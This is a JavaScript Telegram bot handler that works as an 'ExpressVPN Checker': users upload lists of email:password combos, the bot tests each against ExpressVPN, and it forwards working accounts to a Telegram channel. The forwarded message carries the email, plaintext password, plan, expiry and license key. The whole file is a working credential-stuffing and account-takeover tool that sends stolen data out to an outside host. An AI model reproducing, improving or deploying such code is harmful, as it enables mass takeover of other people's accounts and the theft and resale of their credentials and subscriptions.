import { checkExpressVPN } from '../lib/expressChecker.js';
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';

export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const body = req.body;
  if (!body.message) return res.status(200).json({ ok: true });

  const chatId = body.message.chat.id;
  const text = body.message.text;
  const document = body.message.document;

  if (text === '/start') {
    await sendMessage(chatId, "🤖 ExpressVPN Checker Bot\nSend a .txt file with combos (email:password per line).\nI'll check and forward HITs to the channel.");
    return res.status(200).json({ ok: true });
  }

  if (document && document.mime_type === 'text/plain') {
    const fileId = document.file_id;
    const fileUrl = await getFileUrl(fileId);
    if (!fileUrl) {
      await sendMessage(chatId, "❌ Failed to get file.");
      return res.status(200).json({ ok: false });
    }

    const fileContent = await downloadFile(fileUrl);
    if (!fileContent) {
      await sendMessage(chatId, "❌ Failed to download file.");
      return res.status(200).json({ ok: false });
    }

    const lines = fileContent.split(/\r?\n/);
    const combos = [];
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      const idx = trimmed.indexOf(':');
      if (idx === -1) continue;
      const user = trimmed.slice(0, idx).trim();
      const pass = trimmed.slice(idx + 1).trim();
      if (user && pass) combos.push(`${user}:${pass}`);
    }

    if (combos.length === 0) {
      await sendMessage(chatId, "❌ No valid combos found (format: email:password).");
      return res.status(200).json({ ok: false });
    }

    res.status(200).json({ ok: true }); // immediate response
    setTimeout(() => processCombos(chatId, combos), 100);
    return;
  }

  return res.status(200).json({ ok: true });
}

async function processCombos(chatId, combos) {
  let hits = 0;
  const total = combos.length;

  await sendMessage(chatId, `⏳ Checking ${total} combos...`);

  for (let i = 0; i < combos.length; i++) {
    const [user, pass] = combos[i].split(':');
    const result = await checkExpressVPN(user.trim(), pass.trim());
    if (result.hit) {
      hits++;
      await forwardToChannel(result);
    }
    if ((i + 1) % 10 === 0 || i + 1 === total) {
      await sendMessage(chatId, `📊 Progress: ${i+1}/${total} | HITs: ${hits}`);
    }
    await new Promise(r => setTimeout(r, 300));
  }

  let summary = `✅ Complete!\nTotal: ${total}\n🔥 HITS: ${hits}`;
  await sendMessage(chatId, summary);
}

async function sendMessage(chatId, text) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text })
    });
  } catch(e) {}
}

async function getFileUrl(fileId) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`;
  const res = await fetch(url);
  const data = await res.json();
  if (data.ok && data.result.file_path) {
    return `https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}/${data.result.file_path}`;
  }
  return null;
}

async function downloadFile(fileUrl) {
  const res = await fetch(fileUrl);
  return await res.text();
}

async function forwardToChannel(result) {
  if (!TELEGRAM_CHAT_ID) return;
  const message = `🎯 *ExpressVPN HIT*\n\n` +
                  `📧 *Email:* ${result.email}\n` +
                  `🔑 *Password:* \`${result.password}\`\n` +
                  `📋 *Plan:* ${result.plan || '—'}\n` +
                  `📅 *Expiry:* ${result.expiry || '—'}\n` +
                  `🔑 *PC Key:* ${result.pcKey || '—'}\n` +
                  `📅 *Key Expiry:* ${result.keyExpire || '—'}\n` +
                  `📌 *Status:* ${result.keyStatus || '—'}\n\n` +
                  `#ExpressVPN @SHAKIB2016`;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
  } catch(e) {}
}
